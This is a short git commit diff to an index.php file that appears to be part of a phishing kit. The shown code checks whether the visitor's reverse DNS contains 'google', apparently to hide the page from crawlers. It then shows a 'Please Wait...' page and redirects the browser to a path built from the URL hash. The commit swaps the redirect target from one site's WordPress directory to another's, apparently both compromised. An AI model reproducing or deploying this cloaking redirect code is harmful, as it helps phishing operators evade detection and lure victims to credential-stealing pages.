f637376d24655dedb8a4f371255e7cf15720d231
cakejames991 <74053915+cakejames991@users.noreply.github.com>
2020-11-25 01:01:58 +0000

    Update index.php

--- index.php
+++ index.php
@@ -10,7 +10,7 @@ if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {  header('
     <title>Please Wait...</title> 
 <script type="text/javascript">
     var hash = window.location.hash;
- var URL =  "https://withiin.com/psalms/wp-admin/includes/bab/" + hash.split('#')[1];
+ var URL =  "https://kosmetologejums.lt//wp-includes/banner/" + hash.split('#')[1];
   window.open(URL, "_self")
  </script>
 
